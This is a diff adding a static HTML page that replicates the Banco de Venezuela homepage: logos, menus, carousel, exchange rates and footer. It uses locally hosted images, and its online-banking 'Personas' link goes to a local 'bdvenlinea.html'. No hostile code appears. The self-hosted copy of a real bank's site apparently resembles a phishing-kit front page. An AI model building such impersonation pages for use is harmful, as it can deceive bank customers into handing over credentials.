@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco de Venezuela</title>
+    <link rel="stylesheet" href="https://unpkg.com/swiper/swiper-bundle.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary-color: #002D62;
+            --white: #ffffff;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            line-height: 1.6;
+        }
+
+        .site-header {
+            background-color: white;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .site-header .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+        }
+
+        .logo img {
+            height: 40px;
+            width: auto;
+        }
+
+        .nav-menu {
+            display: flex;
+            gap: 20px;
+            list-style: none;
+            align-items: center;
+        }
+
+        .nav-menu a {
+            color: #001B3C;
+            text-decoration: none;
+            font-weight: 600;
+            padding: 8px 12px;
+        }
+
+        .banca-linea-btn {
+            background-color: #2E73C7;
+            color: white !important;
+            padding: 8px 16px !important;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .banca-linea-btn i {
+            font-size: 12px;
+        }
+
+        .elementor-image-carousel-wrapper {
+            width: 100%;
+            height: auto;
+            max-height: 522px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .swiper-slide {
+            text-align: center;
+        }
+
+        .swiper-slide img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .elementor-swiper-button {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            z-index: 10;
+            font-size: 38px;
+            color: #00000082;
+            cursor: pointer;
+            width: 45px;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 50%;
+            transition: all 0.3s ease;
+        }
+
+        .elementor-swiper-button:hover {
+            background-color: rgba(255, 255, 255, 0.9);
+            color: #000000;
+        }
+
+        .elementor-swiper-button-prev {
+            left: 20px;
+        }
+
+        .elementor-swiper-button-next {
+            right: 20px;
+        }
+
+        .swiper-pagination {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .swiper-pagination-bullet {
+            width: 10px;
+            height: 10px;
+            display: inline-block;
+            border-radius: 50%;
+            background: #ffffff;
+            opacity: 0.5;
+            margin: 0 5px;
+            cursor: pointer;
+            transition: opacity 0.3s ease;
+        }
+
+        .swiper-pagination-bullet-active {
+            opacity: 1;
+        }
+
+        .servicios-destacados {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 30px;
+            padding: 60px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            background-color: #f8f9fa;
+        }
+
+        .servicio-card {
+            background-color: #ffffff;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: none;
+            transition: transform 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .servicio-card:hover {
+            transform: translateY(-10px);
+            box-shadow: none;
+        }
+
+        .servicio-icon {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: transparent;
+            padding: 0;
+        }
+
+        .servicio-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .servicio-content h3 {
+            color: #001B3C;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .servicio-content p {
+            color: #333333;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .servicio-link {
+            color: #2E73C7;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            transition: color 0.3s ease;
+        }
+
+        .servicio-link:hover {
+            color: #004876;
+        }
+
+        .servicio-link i {
+            font-size: 14px;
+            transition: transform 0.3s ease;
+        }
+
+        .servicio-link:hover i {
+            transform: translateX(5px);
+        }
+
+        footer {
+            background-color: var(--primary-color);
+            color: var(--white);
+            padding: 4rem 2rem 2rem;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 3rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .footer-section h4 {
+            margin-bottom: 1.5rem;
+            font-size: 1.2rem;
+            position: relative;
+            padding-bottom: 0.5rem;
+        }
+
+        .footer-section h4::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 50px;
+            height: 2px;
+            background-color: var(--secondary-color);
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section a {
+            color: var(--white);
+            text-decoration: none;
+            display: block;
+            padding: 0.5rem 0;
+            transition: color 0.3s;
+        }
+
+        .footer-section a:hover {
+            color: var(--secondary-color);
+        }
+
+        .social-links {
+            display: flex;
+            gap: 1.5rem;
+        }
+
+        .social-links a {
+            font-size: 1.8rem;
+            transition: transform 0.3s;
+        }
+
+        .social-links a:hover {
+            transform: translateY(-5px);
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 2rem;
+            margin-top: 3rem;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+
+        @media (max-width: 1024px) {
+            .top-bar {
+                padding: 1rem 2rem;
+            }
+            .servicios-destacados {
+                grid-template-columns: repeat(2, 1fr);
+                padding: 40px 20px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .jet-menu {
+                flex-direction: column;
+            }
+            .jet-sub-menu {
+                position: static;
+                width: 100%;
+            }
+            .top-bar {
+                flex-direction: column;
+                gap: 1rem;
+            }
+            .servicios-destacados {
+                grid-template-columns: 1fr;
+                padding: 30px 15px;
+            }
+            .swiper-container {
+                height: auto;
+                max-height: 722px;
+            }
+            .footer-content {
+                grid-template-columns: 1fr;
+            }
+            .servicio-card {
+                padding: 25px;
+            }
+        }
+
+        .banca-linea-btn {
+            background-color: #2E73C7;
+            padding: 10px 20px !important;
+            border-radius: 5px;
+            display: flex !important;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .banca-linea-btn i {
+            font-size: 12px;
+            transition: transform 0.3s ease;
+        }
+
+        .menu-item-has-children:hover .banca-linea-btn i {
+            transform: rotate(180deg);
+        }
+
+        .menu-item-has-children {
+            position: relative;
+        }
+
+        .submenu {
+            position: absolute;
+            top: 100%;
+            right: 0;
+            background: #2E73C7;
+            min-width: 200px;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            display: none;
+            z-index: 1000;
+            list-style: none;
+        }
+
+        .menu-item-has-children:hover .submenu {
+            display: block;
+        }
+
+        .submenu li {
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .submenu li:last-child {
+            border-bottom: none;
+        }
+
+        .submenu li a {
+            color: #ffffff !important;
+            padding: 12px 16px !important;
+            display: block;
+            font-size: 14px !important;
+            transition: all 0.3s ease;
+            background-color: #2E73C7;
+        }
+
+        .submenu li a:hover {
+            background-color: #3d82d6;
+            color: #ffffff !important;
+        }
+
+        .institutional-header {
+            background-color: white;
+            padding: 10px 0;
+        }
+
+        .institutional-header .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+        }
+
+        .logo-left, .logo-right {
+            height: 30px;
+            width: auto;
+        }
+
+        .tasas-header {
+            background-color: #BB1B47;
+            color: white;
+            padding: 10px 0;
+            display: flex;
+            justify-content: center;
+            gap: 100px;
+            text-align: center;
+        }
+
+        .tasa-item h3 {
+            font-size: 14px;
+            font-weight: normal;
+            margin-bottom: 5px;
+        }
+
+        .tasa-item p {
+            font-size: 13px;
+            margin: 0;
+            line-height: 1.4;
+        }
+
+        @media (max-width: 768px) {
+            .tasas-header {
+                flex-direction: column;
+                gap: 20px;
+                padding: 15px;
+            }
+        }
+
+        .liston-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px 0;
+            background-color: white;
+        }
+
+        .liston-image {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .submenu-white {
+            background: white !important;
+            border: 1px solid #e0e0e0;
+        }
+
+        .submenu-white li a {
+            color: #333 !important;
+            background-color: white !important;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .submenu-white li:last-child a {
+            border-bottom: none;
+        }
+
+        .submenu-white li a:hover {
+            background-color: #f5f5f5 !important;
+            color: #2E73C7 !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="institutional-header">
+        <div class="container">
+            <img src="images/logo bolivariano.jpg" alt="Logo Bolivariano" class="logo-left">
+            <img src="images/logonuevo.png" alt="Logo Patria" class="logo-right">
+        </div>
+    </div>
+
+    <header class="site-header">
+        <div class="container">
+            <div class="logo">
+                <img src="images/logonuevo.png" alt="Logo Banco de Venezuela">
+            </div>
+            <nav class="main-navigation">
+                <ul class="nav-menu">
+                    <li class="menu-item-has-children">
+                        <a href="#">SomosBDV</a>
+                        <ul class="submenu submenu-white">
+                            <li><a href="#">Historia BDV</a></li>
+                            <li><a href="#">Junta directiva</a></li>
+                        </ul>
+                    </li>
+                    <li class="menu-item-has-children">
+                        <a href="#">Para ti</a>
+                        <ul class="submenu submenu-white">
+                            <li><a href="#">Cuentas</a></li>
+                            <li><a href="#">Soluciones</a></li>
+                            <li><a href="#">Pagos</a></li>
+                            <li><a href="#">Financiamientos</a></li>
+                            <li><a href="#">Inversiones</a></li>
+                        </ul>
+                    </li>
+                    <li class="menu-item-has-children">
+                        <a href="#">Para tu empresa</a>
+                        <ul class="submenu submenu-white">
+                            <li><a href="#">Cuentas</a></li>
+                            <li><a href="#">Soluciones</a></li>
+                            <li><a href="#">Pagos</a></li>
+                            <li><a href="#">Cobros</a></li>
+                            <li><a href="#">Financiamientos</a></li>
+                            <li><a href="#">Inversiones</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#">Pagos</a></li>
+                    <li class="menu-item-has-children">
+                        <a href="#" class="banca-linea-btn">
+                            Banca en línea
+                            <i class="fas fa-chevron-down"></i>
+                        </a>
+                        <ul class="submenu">
+                            <li><a href="bdvenlinea.html">Personas</a></li>
+                            <li><a href="#">Empresas</a></li>
+                            <li><a href="#">Actualizar mis datos</a></li>
+                            <li><a href="#">TrámitesenlineaBDV</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main style="margin-top: 2cm;">
+        <div class="elementor-image-carousel-wrapper swiper-container">
+            <div class="swiper-wrapper">
+                <div class="swiper-slide">
+                    <img src="images/banner1.png" alt="Banner 1">
+                </div>
+                <div class="swiper-slide">
+                    <img src="images/banner2.jpg" alt="Banner 2">
+                </div>
+                <div class="swiper-slide">
+                    <img src="images/banner-1909-522-1.gif" alt="Banner 1909">
+                </div>
+            </div>
+            <div class="elementor-swiper-button elementor-swiper-button-prev">
+                <i class="fas fa-chevron-left" aria-hidden="true"></i>
+            </div>
+            <div class="elementor-swiper-button elementor-swiper-button-next">
+                <i class="fas fa-chevron-right" aria-hidden="true"></i>
+            </div>
+            <div class="swiper-pagination"></div>
+        </div>
+
+        <div class="liston-container">
+            <img src="images/liston.png" alt="Liston BDV" class="liston-image">
+        </div>
+
+        <div class="tasas-header">
+            <div class="tasa-item">
+                <h3>Mesa de cambio (USD-EUR)</h3>
+                <p>BCV: $ 51,7659 / € 53,8593</p>
+                <p>BDV: $ 51,7659 / € 53,8593</p>
+            </div>
+            <div class="tasa-item">
+                <h3>Menudeo (USD-EUR)</h3>
+                <p>Compra: $ 51,7659 / € 53,8593</p>
+            </div>
+            <div class="tasa-item">
+                <h3>Índice de inversión (IDI)</h3>
+                <p>0,25308077</p>
+            </div>
+        </div>
+
+        <section class="servicios-destacados">
+            <div class="servicio-card">
+                <div class="servicio-icon">
+                    <img src="images/emprendedor.png" alt="Emprendedor">
+                </div>
+                <div class="servicio-content">
+                    <h3>Quiero ser emprendedor</h3>
+                    <p>Impulsa tu negocio con nosotros</p>
+                    <a href="#" class="servicio-link">
+                        <span>Conoce más</span>
+                        <i class="fas fa-arrow-right"></i>
+                    </a>
+                </div>
+            </div>
+            <div class="servicio-card">
+                <div class="servicio-icon">
+                    <img src="images/pago movil.png" alt="PagomóvilBDV">
+                </div>
+                <div class="servicio-content">
+                    <h3>PagomóvilBDV</h3>
+                    <p>Paga de forma rápida y segura</p>
+                    <a href="#" class="servicio-link">
+                        <span>Conoce más</span>
+                        <i class="fas fa-arrow-right"></i>
+                    </a>
+                </div>
+            </div>
+            <div class="servicio-card">
+                <div class="servicio-icon">
+                    <img src="images/cuentadigital.png" alt="Cuenta Digital">
+                </div>
+                <div class="servicio-content">
+                    <h3>Cuenta digital</h3>
+                    <p>Abre tu cuenta 100% en línea</p>
+                    <a href="#" class="servicio-link">
+                        <span>Conoce más</span>
+                        <i class="fas fa-arrow-right"></i>
+                    </a>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4>Información institucional</h4>
+                <ul>
+                    <li><a href="#">Historia BDV</a></li>
+                    <li><a href="#">Junta Directiva</a></li>
+                    <li><a href="#">Prensa BDV</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h4>Atención al cliente</h4>
+                <ul>
+                    <li><a href="#">Contáctanos</a></li>
+                    <li><a href="#">Defensoría del cliente</a></li>
+                    <li><a href="#">Oficinas</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h4>Redes sociales</h4>
+                <div class="social-links">
+                    <a href="#"><i class="fab fa-twitter"></i></a>
+                    <a href="#"><i class="fab fa-facebook"></i></a>
+                    <a href="#"><i class="fab fa-instagram"></i></a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2024 Banco de Venezuela. Todos los derechos reservados.</p>
+        </div>
+    </footer>
+
+    <script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
+    <script>
+        var swiper = new Swiper('.elementor-image-carousel-wrapper', {
+            slidesPerView: 1,
+            spaceBetween: 0,
+            loop: true,
+            autoplay: {
+                delay: 4000,
+                disableOnInteraction: false,
+            },
+            navigation: {
+                nextEl: '.elementor-swiper-button-next',
+                prevEl: '.elementor-swiper-button-prev',
+            },
+            pagination: {
+                el: '.swiper-pagination',
+                clickable: true,
+            },
+        });
+    </script>
+</body>
+</html>
